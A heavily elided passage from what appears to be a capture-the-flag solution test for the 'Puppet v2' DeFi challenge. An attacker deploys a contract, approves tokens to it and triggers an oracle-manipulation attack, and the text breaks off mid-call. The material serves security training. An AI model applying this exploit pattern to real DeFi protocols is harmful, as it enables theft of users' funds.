...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackerContract = await (await ethers.getContractFactory("OnChainOracleGoBrr")).deploy(
        ...
        // Approve all tokens to attacker contract
        await (await this.token.connect(attacker).approve(attackerContract.address, ATTACKER_INITIAL_TOKEN_BALANCE)).wait();

        // Execute attack
        const attackerEthBalance = ethers.utils.parseEther("20");
        await (await attackerContract.connect(attacker).heck({
            value: attackerEthBalance.sub(
